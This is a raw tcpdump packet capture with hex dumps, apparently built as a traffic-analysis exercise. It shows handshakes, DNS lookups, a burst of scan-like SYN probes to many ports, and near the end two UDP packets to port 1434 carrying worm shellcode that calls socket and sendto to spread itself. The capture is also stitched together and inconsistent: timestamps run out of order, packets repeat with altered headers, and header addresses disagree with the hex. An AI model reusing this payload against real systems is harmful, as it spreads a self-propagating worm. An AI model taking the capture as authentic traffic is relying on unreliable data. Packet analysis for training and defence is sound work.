17:29:36.804059 IP (tos 0x0, ttl 64, id 5583, offset 0, flags [DF], proto TCP (6), length 60)
    74.125.225.23.33902 > 68.180.206.184.80: Flags [S], cksum 0xf026 (correct), seq 1283898046, win 14600, options [mss 1460,sackOK,TS val 4294946673 ecr 0,nop,wscale 7], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  003c 15cf 4000 4006 0feb 4a7d e117 44b4  .<..@.@...J}..D.
	0x0020:  ce50 846e 0050 4c86 babe 0000 0000 a002  .P.n.PL.........
	0x0030:  3908 f026 0000 0204 05b4 0402 080a ffff  9..&............
	0x0040:  af71 0000 0000 0103 0307                 .q........
17:29:37.804059 IP (tos 0x0, ttl 64, id 5583, offset 0, flags [DF], proto TCP (6), length 60)
    10.97.225.23.33902 > 68.180.206.184.80: Flags [S], cksum 0xf026 (correct), seq 1283898046, win 14600, options [mss 1460,sackOK,TS val 4294946673 ecr 0,nop,wscale 7], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  003c 15cf 4000 4006 0feb 4a7d e117 44b4  .<..@.@...J}..D.
	0x0020:  ce50 846e 0050 4c86 babe 0000 0000 a002  .P.n.PL.........
	0x0030:  3908 f026 0000 0204 05b4 0402 080a ffff  9..&............
	0x0040:  af71 0000 0000 0103 0307                 .q........
17:29:36.804059 IP (tos 0x0, ttl 64, id 5583, offset 0, flags [DF], proto TCP (6), length 60)
    46.129.99.5.33902 > 10.97.0.2.80: Flags [S], cksum 0x2a95 (correct), seq 1283898046, win 14600, options [mss 1460,sackOK,TS val 4294946673 ecr 0,nop,wscale 7], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  003c 15cf 4000 4006 0feb 2e81 6305 0a61  .<..@.@....a...a
	0x0020:  0002 846e 0050 4c86 babe 0000 0000 a002  ...n.PL.........
	0x0030:  3908 2a95 0000 0204 05b4 0402 080a ffff  9.*.............
	0x0040:  af71 0000 0000 0103 0307                 .q........
17:29:36.806254 IP (tos 0x0, ttl 128, id 15, offset 0, flags [DF], proto TCP (6), length 64)
    10.97.0.2.80 > 46.129.99.5.33902: Flags [S.], cksum 0x9ab8 (correct), seq 2552877606, ack 1283898047, win 17520, options [mss 1460,nop,wscale 0,nop,nop,TS val 0 ecr 0,nop,nop,sackOK], length 0
	0x0000:  000c 29c8 e96e 000c 293e 369e 0800 4500  ..)..n..)>6...E.
	0x0010:  0040 000f 4000 8006 e5a6 0a61 0002 2e81  .@..@......a...a
	0x0020:  6305 0050 846e 9829 d226 4c86 babf b012  ...P.n.).&L.....
	0x0030:  4470 9ab8 b785 0204 05b4 0103 0300 0101  Dp..............
	0x0040:  080a 0000 0000 0000 0000 0101 0402       ..............
17:29:36.806317 IP (tos 0x0, ttl 64, id 5584, offset 0, flags [DF], proto TCP (6), length 52)
    46.129.99.5.33902 > 10.97.0.2.80: Flags [.], cksum 0x2794 (correct), seq 1, ack 1, win 115, options [nop,nop,TS val 4294946674 ecr 0], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  0034 15d0 4000 4006 0ff2 2e81 6305 0a61  .4..@.@....a...a
	0x0020:  0002 846e 0050 4c86 babf 9829 d227 8010  ...n.PL....).'..
	0x0030:  0073 2794 0000 0101 080a ffff af72 0000  .s'..........r..
	0x0040:  0000                                     ..
17:41:16.265613 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.97.0.200 tell 10.97.0.1, length 28
	0x0000:  ffff ffff ffff 000c 29c8 e96e 0806 0001  ........)..n....
	0x0010:  0800 0604 0001 000c 29c8 e96e 0a61 0001  ........)..n.a..
	0x0020:  0000 0000 0000 0a61 00c8                 .......a..
17:41:16.265738 ARP, Ethernet (len 6), IPv4 (len 4), Reply 10.97.0.200 is-at 00:50:56:e7:45:3e, length 46
	0x0000:  000c 29c8 e96e 0050 56e7 453e 0806 0001  ..)..n.PV.E>....
	0x0010:  0800 0604 0002 0050 56e7 453e 0a61 00c8  .......PV.E>.a..
	0x0020:  000c 29c8 e96e 0a61 0001 0000 0000 0000  ..)..n.a........
	0x0030:  0000 0000 0000 0000 0000 0000            ............
17:41:16.265746 IP (tos 0x0, ttl 64, id 32328, offset 0, flags [none], proto UDP (17), length 55)
    10.97.0.1.53179 > 10.97.0.200.53: [udp sum ok] 40414+ A? google.ca. (27)
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0037 7e48 0000 4011 9e7e 0a61 0001 0a61  .7~H..@..~.a...a
	0x0020:  00c8 cfbb 0035 0023 d5a6 9dde 0100 0001  .....5.#........
	0x0030:  0000 0000 0000 0667 6f6f 676c 6502 6361  .......google.ca
	0x0040:  0000 0100 01 
17:41:16.267735 IP (tos 0x0, ttl 128, id 34975, offset 0, flags [none], proto UDP (17), length 103)
    10.97.0.200.53 > 10.97.0.1.53179: [udp sum ok] 40414 q: A? google.ca. 3/0/0 google.ca. [5s] A 74.125.225.23, google.ca. [5s] A 74.125.225.24, google.ca. [5s] A 74.125.225.31 (75)
	0x0000:  000c 29c8 e96e 0050 56e7 453e 0800 4500  ..)..n.PV.E>..E.
	0x0010:  0067 889f 0000 8011 53f7 0a61 00c8 0a61  .g......S..a...a
	0x0020:  0001 0035 cfbb 0053 4300 9dde 8180 0001  ...5...SC.......
	0x0030:  0003 0000 0000 0667 6f6f 676c 6502 6361  .......google.ca
	0x0040:  0000 0100 01c0 0c00 0100 0100 0000 0500  ................
	0x0050:  044a 7de1 17c0 0c00 0100 0100 0000 0500  .J}.............
	0x0060:  044a 7de1 18c0 0c00 0100 0100 0000 0500  .J}.............
	0x0070:  044a 7de1 1f                             .J}..
17:41:20.518184 IP (tos 0x0, ttl 64, id 32329, offset 0, flags [none], proto UDP (17), length 59)
    10.97.0.1.33864 > 10.97.0.200.53: [bad udp cksum 0x5e28 -> 0x8f49!] 41305+ A? microsoft.com. (31)
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  003b 7e49 0000 4011 9e79 0a61 0001 0a61  .;~I..@..y.a...a
	0x0020:  00c8 8448 0035 0027 5e28 a159 0100 0001  ...H.5.'.I.Y....
	0x0030:  0000 0000 0000 096d 6963 726f 736f 6674  .......microsoft
	0x0040:  0363 6f6d 0000 0100 01                   .com.....
17:41:20.548693 IP (tos 0x0, ttl 128, id 34976, offset 0, flags [none], proto UDP (17), length 91)
    10.97.0.200.53 > 10.97.0.1.33864: [udp sum ok] 41305 q: A? microsoft.com. 2/0/0 microsoft.com. [5s] A 64.4.11.37, microsoft.com. [5s] A 65.55.58.201 (63)
	0x0000:  000c 29c8 e96e 0050 56e7 453e 0800 4500  ..)..n.PV.E>..E.
	0x0010:  005b 88a0 0000 8011 5402 0a61 00c8 0a61  .[......T..a...a
	0x0020:  0001 0035 8448 0047 b53f a159 8180 0001  ...5.H.G.?.Y....
	0x0030:  0002 0000 0000 096d 6963 726f 736f 6674  .......microsoft
	0x0040:  0363 6f6d 0000 0100 01c0 0c00 0100 0100  .com............
	0x0050:  0000 0500 0440 040b 25c0 0c00 0100 0100  .....@..%.......
	0x0060:  0000 0500 0441 373a c9                   .....A7:.
17:41:25.412619 IP (tos 0x0, ttl 64, id 32330, offset 0, flags [none], proto UDP (17), length 56)
    10.97.0.1.59807 > 10.97.0.200.53: [bad udp cksum 0x5e25 -> 0xabb1!] 14598+ A? tomo7e.com. (28)
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0038 7e4a 0000 4011 9e7b 0a61 0001 0a61  .8~J..@..{.a...a
	0x0020:  00c8 e99f 0035 0024 5e25 3906 0100 0001  .....5.$^%9.....
	0x0030:  0000 0000 0000 0674 6f6d 6f37 6503 636f  .......tomo7e.co
	0x0040:  6d00 0001 0001                           m.....
17:41:25.443850 IP (tos 0x0, ttl 128, id 34977, offset 0, flags [none], proto UDP (17), length 72)
    10.97.0.200.53 > 10.97.0.1.59807: [udp sum ok] 14598 q: A? tomo7e.com. 1/0/0 tomo7e.com. [5s] A 23.88.2.214 (44)
	0x0000:  000c 29c8 e96e 0050 56e7 453e 0800 4500  ..)..n.PV.E>..E.
	0x0010:  0048 88a1 0000 8011 5414 0a61 00c8 0a61  .H......T..a...a
	0x0020:  0001 0035 e99f 0034 50ca 3906 8180 0001  ...5...4P.9.....
	0x0030:  0001 0000 0000 0674 6f6d 6f37 6503 636f  .......tomo7e.co
	0x0040:  6d00 0001 0001 c00c 0001 0001 0000 0005  m...............
	0x0050:  0004 1758 02d6                           ...X..
17:41:36.228156 IP (tos 0x0, ttl 64, id 32331, offset 0, flags [none], proto UDP (17), length 55)
    10.97.0.1.44529 > 10.97.0.200.53: [bad udp cksum 0x5e24 -> 0x51e8!] 40428+ A? yahoo.com. (27)
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0037 7e4b 0000 4011 9e7b 0a61 0001 0a61  .7~K..@..{.a...a
	0x0020:  00c8 adf1 0035 0023 5e24 9dec 0100 0001  .....5.#^$......
	0x0030:  0000 0000 0000 0579 6168 6f6f 0363 6f6d  .......yahoo.com
	0x0040:  0000 0100 01                             .....
17:41:36.259387 IP (tos 0x0, ttl 128, id 34978, offset 0, flags [none], proto UDP (17), length 103)
    10.97.0.200.53 > 10.97.0.1.44529: [udp sum ok] 40428 q: A? yahoo.com. 3/0/0 yahoo.com. [5s] A 206.190.36.45, yahoo.com. [5s] A 98.139.183.24, yahoo.com. [5s] A 98.138.253.109 (75)
	0x0000:  000c 29c8 e96e 0050 56e7 453e 0800 4500  ..)..n.PV.E>..E.
	0x0010:  0067 88a2 0000 8011 53f4 0a61 00c8 0a61  .g......S..a...a
	0x0020:  0001 0035 adf1 0053 0158 9dec 8180 0001  ...5...S.X......
	0x0030:  0003 0000 0000 0579 6168 6f6f 0363 6f6d  .......yahoo.com
	0x0040:  0000 0100 01c0 0c00 0100 0100 0000 0500  ................
	0x0050:  04ce be24 2dc0 0c00 0100 0100 0000 0500  ...$-...........
	0x0060:  0462 8bb7 18c0 0c00 0100 0100 0000 0500  .b..............
	0x0070:  0462 8afd 6d                             .b..m
17:55:38.724090 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.97.0.2 (ff:ff:ff:ff:ff:ff) tell 10.97.0.1, length 28
	0x0000:  ffff ffff ffff 000c 29c8 e96e 0806 0001  ........)..n....
	0x0010:  0800 0604 0001 000c 29c8 e96e 0a61 0001  ........)..n.a..
	0x0020:  ffff ffff ffff 0a61 0002                 .......a..
17:55:38.724263 ARP, Ethernet (len 6), IPv4 (len 4), Reply 10.97.0.2 is-at 00:0c:29:3e:36:9e, length 46
	0x0000:  000c 29c8 e96e 000c 293e 369e 0806 0001  ..)..n..)>6.....
	0x0010:  0800 0604 0002 000c 293e 369e 0a61 0002  ........)>6..a..
	0x0020:  000c 29c8 e96e 0a80 0001 eb64 575a 5014  ..)..n.....dWZP.
	0x0030:  0000 b017 0000 0204 05b4 0103            ............
17:55:38.724634 IP (tos 0x0, ttl 64, id 58076, offset 0, flags [DF], proto UDP (17), length 69)
    10.97.0.1.58119 > 10.97.0.1.53: [udp sum ok] 40516+ PTR? 2.0.128.10.in-addr.arpa. (41)
	0x0000:  0050 56c0 0002 000c 29c8 e96e 0800 4500  .PV.....)..n..E.
	0x0010:  0045 e2dc 4000 4011 434a 0a61 0001 0a61  .E..@.@.CJ.a...a
	0x0020:  0001 e307 0035 0031 bf36 9e44 0100 0001  .....5.1.6.D....
	0x0030:  0000 0000 0000 0132 0130 0331 3238 0231  .......2.0.128.1
	0x0040:  3007 696e 2d61 6464 7204 6172 7061 0000  0.in-addr.arpa..
	0x0050:  0c00 01                                   ...
17:55:42.725014 IP (tos 0x0, ttl 64, id 58077, offset 0, flags [DF], proto UDP (17), length 69)
    10.97.0.1.58119 > 10.97.0.1.53: [upd sum ok] 40516+ PTR? 2.0.128.10.in-addr.arpa. (41)
	0x0000:  0050 56c0 0002 000c 29c8 e96e 0800 4500  .PV.....)..n..E.
	0x0010:  0045 e2dd 4000 4011 4349 0a61 0001 0a61  .E..@.@.CI.a...a
	0x0020:  0001 e307 0035 0031 bf36 9e44 0100 0001  .....5.1.6.D....
	0x0030:  0000 0000 0000 0132 0130 0331 3238 0231  .......2.0.128.1
	0x0040:  3007 696e 2d61 6464 7204 6172 7061 0000  0.in-addr.arpa..
	0x0050:  0c00 01                                ...
17:55:46.725154 IP (tos 0x0, ttl 64, id 58078, offset 0, flags [DF], proto UDP (17), length 69)
    10.97.0.1.58119 > 10.97.0.1.53: [udp sum ok] 40516+ PTR? 2.0.128.10.in-addr.arpa. (41)
	0x0000:  0050 56c0 0002 000c 29c8 e96e 0800 4500  .PV.....)..n..E.
	0x0010:  0045 e2de 4000 4011 4348 0a61 0001 0a61  .E..@.@.CH.a...a
	0x0020:  0001 e307 0035 0031 b236 9e44 0100 0001  .....5.1.6.D....
	0x0030:  0000 0000 0000 0132 0130 0331 3238 0231  .......2.0.128.1
	0x0040:  3007 696e 2d61 6464 7204 6172 7061 0000  0.in-addr.arpa..
	0x0050:  0c00 01                                  ...
17:55:51.727836 IP (tos 0x0, ttl 54, id 21210, offset 0, flags [none], proto TCP (6), length 44)
    10.97.0.1.57473 > 127.128.0.2.554: Flags [S], cksum 0x9db7 (correct), seq 3503014150, win 3072, options [mss 1460], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  002c 52da 0000 3606 1cf0 0a61 0001 7f80  .,R...6....a....
	0x0020:  0002 e081 022a d0cb c106 0000 0000 6002  .....*........`.
	0x0030:  0c00 9db7 0000 0204 05b4                 ..........
17:55:51.727893 IP (tos 0x0, ttl 59, id 16444, offset 0, flags [none], proto TCP (6), length 44)
    10.97.0.1.57473 > 101.12.0.2.993: Flags [S], cksum 0xcce8 (correct), seq 3503014150, win 4096, options [mss 1460], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  002c 403c 0000 3b06 2a8e 0a61 0001 650c  .,@<..;.*..a..e.
	0x0020:  0002 e081 03e1 d0cb c106 0000 0000 6002  ..............`.
	0x0030:  1000 cce8 0000 0204 05b4                 ..........
17:55:51.727920 IP (tos 0x0, ttl 55, id 21986, offset 0, flags [none], proto TCP (6), length 44)
    10.97.0.1.57473 > 22.87.0.2.22: Flags [S], cksum 0x6e1e (correct), seq 3503014150, win 4096, options [mss 1460], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  002c 55e2 0000 3706 18e8 0a61 0001 1657  .,U...7....a...W
	0x0020:  0002 e081 0016 d0cb c106 0000 0000 6002  ..............`.
	0x0030:  1000 6e1e 0000 0204 05b4                 ..n.......
17:55:51.727944 IP (tos 0x0, ttl 52, id 17102, offset 0, flags [none], proto TCP (6), length 44)
    10.97.0.1.57473 > 5.88.2.2.21: Flags [S], cksum 0x981d (correct), seq 3503014150, win 1024, options [mss 1460], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  002c 42ce 0000 3406 2efc 0a61 0001 0558  .,B...4....a...X
	0x0020:  0202 e081 0015 d0cb c106 0000 0000 6002  ..............`.
	0x0030:  0400 981d 0000 0204 05b4                 ..........
17:55:51.727968 IP (tos 0x0, ttl 42, id 20788, offset 0, flags [none], proto TCP (6), length 44)
    10.97.0.1.57473 > 11.33.25.90.1723: Flags [S], cksum 0x4f35 (correct), seq 3503014150, win 3072, options [mss 1460], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  002c 5134 0000 2a06 2a96 0a61 0001 0b21  .,Q4..*.*..a...!
	0x0020:  195a e081 06bb d0cb c106 0000 0000 6002  .Z............`.
	0x0030:  0c00 4f35 0000 0204 05b4                 ..O5......
17:55:51.727993 IP (tos 0x0, ttl 57, id 60647, offset 0, flags [none], proto TCP (6), length 44)
    10.97.0.1.57473 > 96.54.157.80.135: Flags [S], cksum 0xa751 (correct), seq 3503014150, win 2048, options [mss 1460], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  002c ece7 0000 3906 7fe2 0a61 0001 6036  .,....9....a..`6
	0x0020:  9d50 e081 0087 d0cb c106 0000 0000 6002  .P............`.
	0x0030:  0800 a751 0000 0204 05b4                 ...Q......
17:55:51.728030 IP (tos 0x0, ttl 128, id 3032, offset 0, flags [none], proto TCP (6), length 40)
    10.97.0.2.554 > 10.97.0.1.57473: Flags [R.], cksum 0xab9f (correct), seq 0, ack 3503014151, win 0, length 0
	0x0000:  000c 29c8 e96e 000c 293e 369e 0800 4500  ..)..n..)>6...E.
	0x0010:  0028 0bd8 0000 8006 19f6 0a61 0002 0a61  .(.........a...a
	0x0020:  0001 022a e081 0000 0000 d0cb c107 5014  ...*..........P.
	0x0030:  0000 ab9f 0000                           ......
17:55:51.728037 IP (tos 0x0, ttl 128, id 3033, offset 0, flags [none], proto TCP (6), length 40)
    10.97.0.2.993 > 10.97.0.1.57473: Flags [R.], cksum 0xa9e8 (correct), seq 0, ack 3503014151, win 0, length 0
	0x0000:  000c 29c8 e96e 000c 293e 369e 0800 4500  ..)..n..)>6...E.
	0x0010:  0028 0bd9 0000 8006 19f5 0a61 0002 0a61  .(.........a...a
	0x0020:  0001 03e1 e081 0000 0000 d0cb c107 5014  ..............P.
	0x0030:  0000 a9e8 0000                           ......
17:55:51.728047 IP (tos 0x0, ttl 52, id 15341, offset 0, flags [none], proto TCP (6), length 44)
    10.97.0.1.57473 > 213.114.64.8.1025: Flags [S], cksum 0x77ef (correct), seq 3503014150, win 1024, options [mss 1460], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  002c 3bed 0000 3406 35dd 0a61 0001 d572  .,;...4.5..a...r
	0x0020:  4008 e081 0401 d0cb c106 0000 0000 6002  @.............`.
	0x0030:  0400 77ef 0000 0204 05b4                 ..w.......
17:55:51.728086 IP (tos 0x0, ttl 128, id 3034, offset 0, flags [none], proto TCP (6), length 40)
    10.97.0.2.22 > 10.97.0.1.57473: Flags [R.], cksum 0xadb3 (correct), seq 0, ack 3503014151, win 0, length 0
	0x0000:  000c 29c8 e96e 000c 293e 369e 0800 4500  ..)..n..)>6...E.
	0x0010:  0028 0bda 0000 8006 19f4 0a61 0002 0a61  .(.........a...a
	0x0020:  0001 0016 e081 0000 0000 d0cb c107 5014  ..............P.
	0x0030:  0000 adb3 0000                           ......
17:55:51.728089 IP (tos 0x0, ttl 128, id 3035, offset 0, flags [none], proto TCP (6), length 40)
    10.97.0.2.21 > 10.97.0.1.57473: Flags [R.], cksum 0xadb4 (correct), seq 0, ack 3503014151, win 0, length 0
	0x0000:  000c 29c8 e96e 000c 293e 369e 0800 4500  ..)..n..)>6...E.
	0x0010:  0028 0bdb 0000 8006 19f3 0a61 0002 0a61  .(.........a...a
	0x0020:  0001 0015 e081 0000 0000 d0cb c107 5014  ..............P.
	0x0030:  0000 adb4 0000                           ......
17:55:51.728091 IP (tos 0x0, ttl 128, id 3036, offset 0, flags [none], proto TCP (6), length 40)
    10.97.0.2.1723 > 10.97.0.1.57473: Flags [R.], cksum 0xa70e (correct), seq 0, ack 3503014151, win 0, length 0
	0x0000:  000c 29c8 e96e 000c 293e 369e 0800 4500  ..)..n..)>6...E.
	0x0010:  0028 0bdc 0000 8006 19f2 0a61 0002 0a61  .(.........a...a
	0x0020:  0001 06bb e081 0000 0000 d0cb c107 5014  ..............P.
	0x0030:  0000 a70e 0000                           ......
17:55:51.728100 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)
    10.97.0.1.57473 > 10.97.0.2.135: Flags [R], cksum 0xad52 (correct), seq 3503014151, win 0, length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  0028 0000 4000 4006 25ce 0a61 0001 0a61  .(..@.@.%..a...a
	0x0020:  0002 e081 0087 d0cb c107 0000 0000 5004  ..............P.
	0x0030:  0000 ad52 0000                           ...R..
17:55:51.728120 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)
    10.97.0.1.57473 > 10.97.0.2.1025: Flags [R], cksum 0xa9d8 (correct), seq 3503014151, win 0, length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  0028 0000 4000 4006 25ce 0a61 0001 0a61  .(..@.@.%..a...a
	0x0020:  0002 e081 0401 d0cb c107 0000 0000 5004  ..............P.
	0x0030:  0000 a9d8 0000                           ......
17:55:51.728149 IP (tos 0x0, ttl 42, id 5884, offset 0, flags [none], proto TCP (6), length 44)
    10.97.0.1.57473 > 77.254.155.249.3306: Flags [S], cksum 0xbe0c (correct), seq 3503014150, win 3072, options [mss 1460], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  002c 16fc 0000 2a06 64ce 0a61 0001 4dfe  .,....*.d..a..M.
	0x0020:  9bf9 e081 0cea d0cb c106 0000 0000 6002  ..............`.
	0x0030:  0c00 be0c 0000 0204 05b4                 ..........
17:55:51.728175 IP (tos 0x0, ttl 48, id 53396, offset 0, flags [none], proto TCP (6), length 44)
    10.97.0.1.57473 > 48.177.164.29.113: Flags [S], cksum 0xfcd7 (correct), seq 3503014150, win 1024, options [mss 1460], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  002c d094 0000 3006 a535 0a61 0001 30b1  .,....0..5.a..0.
	0x0020:  a41d e081 0071 d0cb c106 0000 0000 6002  .....q........`.
	0x0030:  0400 fcd7 0000 0204 05b4                 ..........
17:55:51.728204 IP (tos 0x0, ttl 128, id 3039, offset 0, flags [none], proto TCP (6), length 40)
    10.97.0.2.3306 > 10.97.0.1.57473: Flags [R.], cksum 0xa0df (correct), seq 0, ack 3503014151, win 0, length 0
	0x0000:  000c 29c8 e96e 000c 293e 369e 0800 4500  ..)..n..)>6...E.
	0x0010:  0028 0bdf 0000 8006 19ef 0a61 0002 0a61  .(.........a...a
	0x0020:  0001 0cea e081 0000 0000 d0cb c107 5014  ..............P.
	0x0030:  0000 a0df 0000                           ......
17:55:51.728213 IP (tos 0x0, ttl 47, id 34199, offset 0, flags [none], proto TCP (6), length 44)
    10.97.0.1.57473 > 239.23.188.65.1720: Flags [S], cksum 0x3d7b (correct), seq 3503014150, win 4096, options [mss 1460], length 0
	0x0000:  000c 293e 369e 000c 29c8 e96e 0800 4500  ..)>6...)..n..E.
	0x0010:  002c 8597 0000 2f06 f132 0a61 0001 ef17  .,..../..2.a....
	0x0020:  bc41 e081 06b8 d0cb c106 0000 0000 6002  .A............`.
	0x0030:  1000 3d7b 0000 0204 05b4                 ..={......
17:41:16.265613 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.97.0.200 tell 10.97.0.1, length 28
	0x0000:  ffff ffff ffff 000c 29c8 e96e 0806 0001  ........)..n....
	0x0010:  0800 0604 0001 000c 29c8 e96e 0a61 0001  ........)..n.a..
	0x0020:  0000 0000 0000 0a61 00c8                 .......a..
17:41:16.265738 ARP, Ethernet (len 6), IPv4 (len 4), Reply 10.97.0.200 is-at 00:50:56:e7:45:3e, length 46
	0x0000:  000c 29c8 e96e 0050 56e7 453e 0806 0001  ..)..n.PV.E>....
	0x0010:  0800 0604 0002 0050 56e7 453e 0a61 00c8  .......PV.E>.a..
	0x0020:  000c 29c8 e96e 0a61 0001 0000 0000 0000  ..)..n.a........
	0x0030:  0000 0000 0000 0000 0000 0000            ............
17:41:16.265746 IP (tos 0x0, ttl 64, id 32328, offset 0, flags [none], proto UDP (17), length 404)
    10.97.0.1.53179 > 65.133.87.200.1434: [udp sum ok]
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0194 7e48 0000 4011 9e7e 0a61 0001 4185  ..~H..@..~.a..A.
	0x0020:  57c8 cfbb 059a 0180 cef9 0401 0101 0101  W...............
	0x0030:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0040:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0050:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0060:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0070:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0080:  0101 0101 0101 0101 0101 01dc c9b0 42eb  ..............B.
	0x0090:  0e01 0101 0101 0101 70ae 4201 70ae 4290  ........p.B.p.B.
	0x00a0:  9090 9090 9090 9068 dcc9 b042 b801 0101  .......h...B....
	0x00b0:  0131 c9b1 1850 e2fd 3501 0101 0550 89e5  .1...P..5....P..
	0x00c0:  5168 2e64 6c6c 6865 6c33 3268 6b65 726e  Qh.dllhel32hkern
	0x00d0:  5168 6f75 6e74 6869 636b 4368 4765 7454  QhounthickChGetT
	0x00e0:  66b9 6c6c 5168 3332 2e64 6877 7332 5f66  f.llQh32.dhws2_f
	0x00f0:  b965 7451 6873 6f63 6b66 b974 6f51 6873  .etQhsockf.toQhs
	0x0100:  656e 64be 1810 ae42 8d45 d450 ff16 508d  end....B.E.P..P.
	0x0110:  45e0 508d 45f0 50ff 1650 be10 10ae 428b  E.P.E.P..P....B.
	0x0120:  1e8b 033d 558b ec51 7405 be1c 10ae 42ff  ...=U..Qt.....B.
	0x0130:  16ff d031 c951 5150 81f1 0301 049b 81f1  ...1.QQP........
	0x0140:  0101 0101 518d 45cc 508b 45c0 50ff 166a  ....Q.E.P.E.P..j
	0x0150:  116a 026a 02ff d050 8d45 c450 8b45 c050  .j.j...P.E.P.E.P
	0x0160:  ff16 89c6 09db 81f3 3c61 d9ff 8b45 b48d  ........<a...E..
	0x0170:  0c40 8d14 88c1 e204 01c2 c1e2 0829 c28d  .@...........)..
	0x0180:  0490 01d8 8945 b46a 108d 45b0 5031 c951  .....E.j..E.P1.Q
	0x0190:	 6681 f178 0151 8d45 0350 8b45 ac50 ffd6  f..x.Q.E.P.E.P..
	0x01a0:	 ebca					  ..
17:41:16.266323 IP (tos 0x0, ttl 64, id 32328, offset 0, flags [none], proto UDP (17), length 404)
    10.97.0.1.53179 > 87.54.66.132.1434: [udp sum ok]
	0x0000:  0050 56e7 453e 000c 29c8 e96e 0800 4500  .PV.E>..)..n..E.
	0x0010:  0194 7e48 0000 4011 9e7e 0a61 0001 5736  ..~H..@..~.a..W6
	0x0020:  4284 cfbb 059a 0180 8265 0401 0101 0101  B........e......
	0x0030:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0040:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0050:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0060:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0070:  0101 0101 0101 0101 0101 0101 0101 0101  ................
	0x0080:  0101 0101 0101 0101 0101 01dc c9b0 42eb  ..............B.
	0x0090:  0e01 0101 0101 0101 70ae 4201 70ae 4290  ........p.B.p.B.
	0x00a0:  9090 9090 9090 9068 dcc9 b042 b801 0101  .......h...B....
	0x00b0:  0131 c9b1 1850 e2fd 3501 0101 0550 89e5  .1...P..5....P..
	0x00c0:  5168 2e64 6c6c 6865 6c33 3268 6b65 726e  Qh.dllhel32hkern
	0x00d0:  5168 6f75 6e74 6869 636b 4368 4765 7454  QhounthickChGetT
	0x00e0:  66b9 6c6c 5168 3332 2e64 6877 7332 5f66  f.llQh32.dhws2_f
	0x00f0:  b965 7451 6873 6f63 6b66 b974 6f51 6873  .etQhsockf.toQhs
	0x0100:  656e 64be 1810 ae42 8d45 d450 ff16 508d  end....B.E.P..P.
	0x0110:  45e0 508d 45f0 50ff 1650 be10 10ae 428b  E.P.E.P..P....B.
	0x0120:  1e8b 033d 558b ec51 7405 be1c 10ae 42ff  ...=U..Qt.....B.
	0x0130:  16ff d031 c951 5150 81f1 0301 049b 81f1  ...1.QQP........
	0x0140:  0101 0101 518d 45cc 508b 45c0 50ff 166a  ....Q.E.P.E.P..j
	0x0150:  116a 026a 02ff d050 8d45 c450 8b45 c050  .j.j...P.E.P.E.P
	0x0160:  ff16 89c6 09db 81f3 3c61 d9ff 8b45 b48d  ........<a...E..
	0x0170:  0c40 8d14 88c1 e204 01c2 c1e2 0829 c28d  .@...........)..
	0x0180:  0490 01d8 8945 b46a 108d 45b0 5031 c951  .....E.j..E.P1.Q
	0x0190:	 6681 f178 0151 8d45 0350 8b45 ac50 ffd6  f..x.Q.E.P.E.P..
	0x01a0:	 ebca					  ..
17:41:16.267735 IP (tos 0x0, ttl 128, id 34975, offset 0, flags [none], proto UDP (17), length 103)
    10.97.0.200.53 > 10.97.0.1.53179: [udp sum ok] 40414 q: A? google.ca. 3/0/0 google.ca. [5s] A 74.125.225.23, google.ca. [5s] A 74.125.225.24, google.ca. [5s] A 74.125.225.31 (75)
	0x0000:  000c 29c8 e96e 0050 56e7 453e 0800 4500  ..)..n.PV.E>..E.
	0x0010:  0067 889f 0000 8011 53f7 0a61 00c8 0a61  .g......S..a...a
	0x0020:  0001 0035 cfbb 0053 4300 9dde 8180 0001  ...5...SC.......
	0x0030:  0003 0000 0000 0667 6f6f 676c 6502 6361  .......google.ca
	0x0040:  0000 0100 01c0 0c00 0100 0100 0000 0500  ................
